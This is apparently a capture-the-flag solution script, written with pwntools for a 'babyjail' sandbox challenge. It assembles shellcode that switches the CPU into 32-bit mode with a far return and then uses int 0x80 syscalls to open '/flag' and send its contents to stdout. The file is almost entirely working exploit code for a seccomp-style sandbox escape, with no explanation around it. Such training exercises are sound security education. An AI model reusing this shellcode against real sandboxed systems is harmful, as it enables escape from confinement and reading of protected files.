'''
openat
'''

from pwn import *
context.arch = "amd64"

my_sc = asm('''

    mov rsp, 0x1337500
    call to32
    push 0x67
    push 0x616c662f
    mov ebx, esp
    mov ecx, 0
    mov eax, 5
    int 0x80
    mov ebx, 1
    mov ecx, eax
    mov edx, 0
    mov esi, 0x3e8
    mov eax, 0xbb
    int 0x80
to32:
    mov dword ptr [rsp + 4], 0x23
    retf


''')
# display the bytes
print(disasm(my_sc))
# fd = open("ttt-raw","wb+")
# fd.write(my_sc)
# fd.close()
# def preexec_openfd():
#     fd = os.open("/", flags=0x20000)
#     os.dup2(3, fd)

p = process("/challenge/babyjail_level9")
# context.terminal = ['tmux', 'splitw', '-h']  # Attempting to use multixterm
# p = gdb.debug(["/challenge/babyjail_level3", "/"], gdbscript="source /opt/gef/gef.py")
p.send(my_sc)


all = p.recvall()
print(all.decode())